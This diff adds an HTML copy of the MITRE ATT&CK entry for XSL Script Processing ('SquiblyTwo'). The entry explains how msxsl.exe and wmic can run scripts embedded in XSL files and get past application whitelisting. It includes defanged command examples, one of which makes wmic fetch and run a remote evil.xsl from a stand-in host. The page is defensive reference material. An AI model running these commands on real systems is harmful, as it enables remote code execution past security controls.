@@ -1,0 +1,24 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>XSL Script Processing and SquiblyTwo</title>
+</head><body><a href="https://attack.mitre.org/techniques/T1220/">https://attack.mitre.org/techniques/T1220/</a>&nbsp; <br/>
+<br/>
+<br/>
+<div style="text-align: left"><span style="font-family: Roboto-Regular"><span style="font-size: 10pt">Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. <a href="https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script">[1]</a><br/>
+</span></span></div><span style="font-size: 10pt"><br/>
+<div style="text-align: left"><span style="font-family: Roboto-Regular">Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to <a href="https://attack.mitre.org/techniques/T1127">Trusted Developer Utilities</a>, the Microsoft common line transformation utility binary (msxsl.exe) <a href="https://www.microsoft.com/download/details.aspx?id=21714">[2]</a> can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. <a href="https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/">[3]</a> Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. <a href="https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/">[4]</a><br/>
+</span></div><br/>
+<div style="text-align: left"><span style="font-family: Roboto-Regular">Command-line example: <a href="https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/">[3]</a><br/>
+</span></div></span><ul><li><span style="font-size: 10pt">msxsl.exe customers[.]xml script[.]xsl</span></li>
+</ul>
+&nbsp;<br/>
+<span style="font-size: 10pt"><br/>
+<div style="text-align: left"><span style="font-family: Roboto-Regular">Another variation of this technique, dubbed "Squiblytwo", involves using <a href="https://attack.mitre.org/techniques/T1047">Windows Management Instrumentation</a> to invoke JScript or VBScript within an XSL file. <a href="https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html">[5]</a> This technique can also execute local/remote scripts and, similar to its <a href="https://attack.mitre.org/techniques/T1117">Regsvr32</a>/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool.<br/>
+</span></div><br/>
+<div style="text-align: left"><span style="font-family: Roboto-Regular">Command-line examples: <a href="https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html">[5]</a><br/>
+</span></div></span><ul><li><span style="font-size: 10pt">Local File: wmic process list /FORMAT:evil[.]xsl</span></li>
+<li>Remote File: wmic os get /FORMAT:"https[:]//example[.]com/evil[.]xsl"</li>
+</ul>
+&nbsp;</body></html>
